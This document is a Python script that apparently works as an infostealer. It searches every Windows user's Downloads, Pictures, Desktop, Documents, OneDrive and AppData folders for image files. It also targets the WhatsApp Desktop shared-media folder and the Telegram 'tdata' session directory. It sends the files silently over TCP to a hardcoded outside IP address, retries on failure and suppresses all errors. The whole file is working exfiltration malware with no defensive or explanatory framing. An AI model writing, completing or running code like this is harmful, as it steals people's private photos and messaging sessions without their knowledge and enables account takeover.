import socket
import os
import hashlib
from pathlib import Path
import time
import sys
import threading

def get_user_folders():
    user_folders = []
    try:
        drives = [d for d in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' if os.path.exists(f'{d}:\\')]
        for drive in drives:
            users_dir = f"{drive}:\\Users"
            if not os.path.exists(users_dir):
                continue
                
            for user in os.listdir(users_dir):
                user_path = os.path.join(users_dir, user)
                if os.path.isdir(user_path) and not user.lower() in ['default', 'public', 'default user', 'all users']:
                    locations = [
                        os.path.join(user_path, "Downloads"),
                        os.path.join(user_path, "Pictures"),
                        os.path.join(user_path, "Desktop"),
                        os.path.join(user_path, "Documents"),
                        os.path.join(user_path, "OneDrive", "Pictures"),
                        os.path.join(user_path, "OneDrive", "Desktop"),
                        os.path.join(user_path, "Pictures", "Camera Roll"),
                        os.path.join(user_path, "Pictures", "Screenshots"),
                        os.path.join(user_path, "Videos", "Captures"),
                        os.path.join(user_path, "OneDrive", "Camera Roll"),
                        os.path.join(user_path, "OneDrive", "Documents"),
                        os.path.join(user_path, "AppData", "Local", "Packages")
                    ]
                user_folders.extend([loc for loc in locations if os.path.exists(loc)])
    except:
        pass
    
    whatsapp_path = r"C:\Users\light\AppData\Local\Packages\5319275A.WhatsAppDesktop_cv1g1gvanyjgm\LocalState\shared"
    if os.path.exists(whatsapp_path):
        user_folders.append(whatsapp_path)
        
    telegram_path = os.path.join(os.environ.get('APPDATA', ''), 'Telegram Desktop', 'tdata')
    if os.path.exists(telegram_path):
        user_folders.append(telegram_path)
        
    return user_folders

DEFAULT_CONFIG = {
    "source_folders": get_user_folders(),
    "dest_ip": "115.96.170.51",
    "dest_port": 25565,
    "chunk_size": 32768,
    "retry_attempts": 5,
    "retry_delay": 3,
    "allowed_extensions": ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.tiff', '.raw']
}

def calculate_checksum(file_path):
    sha256 = hashlib.sha256()
    with open(file_path, 'rb') as f:
        for chunk in iter(lambda: f.read(8192), b''):
            sha256.update(chunk)
    return sha256.hexdigest()

def send_file(filepath, base_folder, sock):
    try:
        rel_path = os.path.relpath(filepath, base_folder)
        filesize = os.path.getsize(filepath)
        checksum = calculate_checksum(filepath)
        header = f"{rel_path}|{filesize}|{checksum}"
        sock.sendall(header.encode())
        response = sock.recv(1024).decode()

        if response.startswith("READY"):
            try:
                with open(filepath, 'rb') as f:
                    bytes_sent = 0
                    while bytes_sent < filesize:
                        chunk = f.read(DEFAULT_CONFIG['chunk_size'])
                        if not chunk:
                            break
                        sock.sendall(chunk)
                        bytes_sent += len(chunk)

                result = sock.recv(1024).decode()
                return result == "SUCCESS" or result == "SKIP"
            except:
                return False
        elif response == "SKIP":
            return True
        else:
            return False
    except:
        return False

def find_image_files(start_path):
    files_found = []
    try:
        for entry in os.scandir(start_path):
            try:
                if entry.is_file(follow_symlinks=False):
                    if any(entry.name.lower().endswith(ext) for ext in DEFAULT_CONFIG['allowed_extensions']):
                        try:
                            with open(entry.path, 'rb') as f:
                                magic_bytes = f.read(8)
                                # Check for common image file signatures
                                if any(magic_bytes.startswith(sig) for sig in [
                                    b'\xFF\xD8\xFF',  # JPEG
                                    b'\x89PNG\r\n\x1a\n',  # PNG
                                    b'GIF87a', b'GIF89a',  # GIF
                                    b'BM',  # BMP
                                    b'II*\x00', b'MM\x00*'  # TIFF
                                ]):
                                    files_found.append(entry.path)
                        except:
                            continue
                elif entry.is_dir(follow_symlinks=False):
                    name = entry.name.lower()
                    if not name.startswith(('.', '$', 'system volume information', 'windows', 'program files', 'program files (x86)')):
                        files_found.extend(find_image_files(entry.path))
            except:
                continue
    except:
        pass
    return files_found

def animate():
    while threading.current_thread().keep_running:
        time.sleep(5)

def main():
    all_files = []
    for folder in DEFAULT_CONFIG['source_folders']:
        files = find_image_files(folder)
        all_files.extend([(f, folder) for f in files])

    if not all_files:
        return

    animation_thread = threading.Thread(target=animate)
    animation_thread.keep_running = True
    animation_thread.daemon = True
    animation_thread.start()

    try:
        for attempt in range(DEFAULT_CONFIG['retry_attempts']):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.settimeout(30)
                    sock.connect((DEFAULT_CONFIG['dest_ip'], DEFAULT_CONFIG['dest_port']))

                    failed_files = []
                    for file_path, base_folder in all_files:
                        try:
                            if os.path.exists(file_path) and os.access(file_path, os.R_OK):
                                if not send_file(file_path, base_folder, sock):
                                    failed_files.append((file_path, base_folder))
                        except:
                            failed_files.append((file_path, base_folder))

                    sock.sendall(b"DONE")

                    if not failed_files:
                        break
                    all_files = failed_files

            except:
                if attempt < DEFAULT_CONFIG['retry_attempts'] - 1:
                    time.sleep(DEFAULT_CONFIG['retry_delay'])
                else:
                    break
    finally:
        animation_thread.keep_running = False
        animation_thread.join()

if __name__ == "__main__":
    try:
        main()
    except:
        pass
